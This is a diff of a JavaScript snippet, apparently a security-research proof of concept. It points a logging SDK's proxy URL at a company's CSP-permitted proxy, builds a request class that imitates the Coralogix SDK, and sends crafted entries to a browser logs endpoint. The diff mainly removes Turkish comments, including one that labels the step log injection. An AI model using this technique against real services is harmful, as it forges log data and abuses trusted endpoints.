@@ -5,12 +5,11 @@
  */
 
 (function () {
-  // 1. SDK konfigürasyonunu değiştir (proxy + suffix)
+
   window.sdkConfig = window.sdkConfig || {};
-  window.sdkConfig.proxyUrl = "https://au.floqast.app/cxproxy";  // CSP'de izinli
+  window.sdkConfig.proxyUrl = "https://au.floqast.app/cxproxy";  
   window.sdkConfig.suffix = "/browser/v1beta/logs";              // Coralogix endpoint
 
-  // 2. Özel Request sınıfı (Coralogix SDK'nın mantığını taklit eder)
   class EnesRequest {
     constructor(requestConfig) {
       this.requestConfig = requestConfig;
@@ -47,7 +46,6 @@
     }
   }
 
-  // 3. Log enjekte et
   const req = new EnesRequest({
     suffix: "/browser/v1beta/logs",
     headers: { "Content-Type": "application/json" }
